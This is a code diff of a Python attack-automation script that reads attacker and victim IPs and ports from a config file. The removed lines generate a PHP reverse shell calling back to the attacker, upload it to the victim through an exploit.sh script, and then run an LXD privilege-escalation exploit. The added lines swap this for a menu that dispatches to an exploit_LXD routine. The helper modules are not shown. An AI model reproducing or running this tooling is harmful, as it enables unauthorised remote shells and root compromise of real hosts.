@@ -4,26 +4,13 @@ import sys
 import requests
 import errno
 import socket
-import my_reverse_shell
 
-from Privilege_Escalation_LXD import LXD_exploit
-
+from exploit_LXD import exploit_LXD
 from datetime import datetime
 from configparser import ConfigParser 	
 
 if os.geteuid() != 0:
 		exit("[-] You need root privileges to run this script")	  	  
-	
-def launch_exploit(attacker_info, victim_info):
-	now = datetime.now()
-
-	os.system('''bash exploit.sh -u {ip} -f {path}'''.format(ip = victim_info["ip"], path = ( os.getcwd() + '/reverse_shell.php')))
-
-	print("[*] Checking if url was generated")
-
-	
-		
-
 	
 def main():
 
@@ -55,29 +42,13 @@ def main():
 	config_object.read("config.ini")
 	attacker_info = config_object["ATTACKERINFO"]
 	victim_info = config_object["VICTIMINFO"]
-
-	f = open("reverse_shell.php", "w")
-
-	code = my_reverse_shell.gen_reverse_shell(attacker_info)
-
-	f.write(code)
-
-	f.close()
-
-	print('[+] Reverse Shell generated')
-
-	flag = False
-
-		
-
-	print('[*] Executing exploit')
+	general_info = config_object["GENERALINFO"]
 	
-	print('[*] Sending the payload...')
-	launch_exploit(attacker_info, victim_info)
-	user_dir = os.getcwd()
-	print('[*] Proceeding to execute the reverse shell')
-	#os.system("python3 {dir}/Privilege_Escalation_LXD/main.py {ip} {port} {v_ip} {v_port}".format(dir = user_dir, ip = attacker_info["ip"], port = attacker_info["port"], v_ip = victim_info['ip'], v_port = victim_info['port']))
-	LXD_exploit.run(attacker_info["ip"], attacker_info["port"], victim_info['ip'], victim_info['port'])
+	match int(general_info['exploit']):
+		case 1:
+			exploit_LXD()
+		case default:
+			sys.exit('Something went wrong :(\nExploit chosen is not valid')
 	
 if __name__ == '__main__':
 	main()
